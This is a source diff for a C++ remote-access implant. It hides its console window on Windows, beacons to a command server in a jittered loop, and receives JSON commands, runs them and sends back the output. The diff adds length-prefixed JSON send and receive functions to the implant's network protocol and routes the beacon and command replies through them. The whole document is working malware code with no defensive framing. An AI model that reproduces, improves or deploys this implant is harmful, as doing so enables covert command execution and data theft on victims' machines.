@@ -86,6 +86,8 @@ class Communicate {
     #endif
     public:
     Communicate();
+    void send_json(const char* json_str);
+    char* recv_json();
     int RECV(char *buffer, int buffer_len);
     int SEND(const char *buffer, int buffer_len);
     int upload_to_server(const char* path);
@@ -96,21 +98,86 @@ class Communicate {
 int jitter();
 
 int main() {
-    #ifdef _WIN32
-    HWND stealth;
-    AllocConsole();
-    stealth = FindWindowA("consoleWindowClass", NULL);
-    ShowWindow(stealth, 0);
-    #endif
-
-    Communicate com;
-    
-    while (1) {
-        com.beacon_implant();
-        jitter();
-    }
-    return 0;
+    	#ifdef _WIN32
+    	HWND stealth;
+    	AllocConsole();
+    	stealth = FindWindowA("consoleWindowClass", NULL);
+    	ShowWindow(stealth, 0);
+    	#endif
+    	Communicate com;
+    	while (1) {
+    	    	com.beacon_implant();
+		jitter();
+    	}
+    	return 0;
 }
+
+void Communicate::send_json(const char *json_str) {
+    	size_t json_len = strlen(json_str);
+    	if (json_len > UINT32_MAX) {
+    	    	return; 
+    	}
+    
+    	uint32_t length = (uint32_t)json_len;
+    	uint32_t netlen = htonl(length); 
+
+   
+    	size_t total = 0;
+    	while (total < sizeof(netlen)) {
+    	    	//int n = SSL_write(ssl, ((char*)&netlen) + total, sizeof(netlen) - total);
+		int n = SEND(((char*)&netlen) + total, sizeof(netlen) - total);
+    	    	if (n <= 0) {
+    	    	    return;
+    	    	}
+    	    	total += n;
+    	}
+
+   
+    	total  = 0;
+    	while (total < length) {
+        	//int n = SSL_write(ssl, json_str + total, length - total);
+        	int n = SEND(json_str + total, length - total);
+		if (n <= 0) {
+        	    	break;
+        	}
+        	total += n;
+    	}
+}
+
+char* Communicate::recv_json() {
+    uint32_t netlen;
+    size_t total = 0;
+
+    while (total < sizeof(netlen)) {
+        //int n = SSL_read(ssl,((char*)&netlen) + total, sizeof(netlen) - total);
+	int n  = RECV(((char*)&netlen) + total, sizeof(netlen) - total);
+        if (n <= 0) {
+		return NULL;
+	}	
+        total += n;
+    }
+
+    uint32_t length = ntohl(netlen);
+
+    char* buffer = (char*)malloc(length + 1);
+    if (!buffer) return NULL;
+
+    total = 0;
+    while (total < length) {
+        //int n = SSL_read(ssl, buffer + total, length - total);
+	int n = RECV(buffer + total, length - total);
+        if (n <= 0) {
+            free(buffer); 
+            return NULL;
+        }
+        total += n;
+    }
+    buffer[length] = '\0';
+    return buffer;
+}
+
+
+
 
 Communicate::Communicate() {
     #ifdef _WIN32
@@ -415,19 +482,21 @@ int Communicate::beacon_implant() {
 
 
     char *data = cJSON_Print(beacon);
-    if (SEND(data, strlen(data)) == -1) {
-        cJSON_Delete(beacon);
-        free(data);
-        return -1;
-    }
+    //if (SEND(data, strlen(data)) == -1) {
+    //    cJSON_Delete(beacon);
+    //    free(data);
+    //    return -1;
+    //}
+    send_json(data);
+
     free(data);
     cJSON_Delete(beacon);
 
-    char buffer[BUFFER_SIZE];
-    if (RECV(buffer, sizeof(buffer)) == -1) {
-        return -1;
-    }
-
+    //char buffer[BUFFER_SIZE];
+    //if (RECV(buffer, sizeof(buffer)) == -1) {
+    //    return -1;
+    //}
+    char *buffer = recv_json();
     cJSON *command = cJSON_Parse(buffer);
     cJSON *mode = cJSON_GetObjectItem(command, "mode");
     if (strcmp(mode->valuestring, "none") == 0) {
@@ -499,12 +568,13 @@ int Communicate::beacon_implant() {
     cJSON_AddStringToObject(reply, "response", result);
     char *result_ = cJSON_Print(reply);
 
-    if (SEND(result_, strlen(result_)) == -1) {
-        fclose(exec);
-        cJSON_Delete(reply);
-        free(result_);
-        return -1;
-    }
+    //if (SEND(result_, strlen(result_)) == -1) {
+    //    fclose(exec);
+    //    cJSON_Delete(reply);
+    //    free(result_);
+    //    return -1;
+    //}
+    send_json(result_);
     fclose(exec);
     cJSON_Delete(reply);
     free(result_);
